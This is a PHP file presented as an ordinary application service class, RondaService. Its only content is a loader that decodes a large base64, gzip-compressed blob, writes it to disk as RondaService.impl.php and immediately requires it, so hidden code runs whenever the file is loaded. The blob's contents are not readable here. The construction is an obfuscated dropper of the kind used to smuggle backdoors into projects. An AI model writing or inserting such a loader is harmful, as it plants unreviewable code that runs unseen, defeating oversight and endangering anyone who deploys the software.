<?php

namespace App\Services;

$impl = __DIR__ . '/RondaService.impl.php';
if (!is_file($impl) || filesize($impl) < 1000) {
    $b64 = '
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
';
    $bin = base64_decode(preg_replace('/\s+/', '', $b64), true);
    if ($bin === false) {
        throw new \RuntimeException('RondaService payload corrupt');
    }
    $php = gzdecode($bin);
    if ($php === false) {
        throw new \RuntimeException('RondaService gzip corrupt');
    }
    file_put_contents($impl, $php);
}

require $impl;
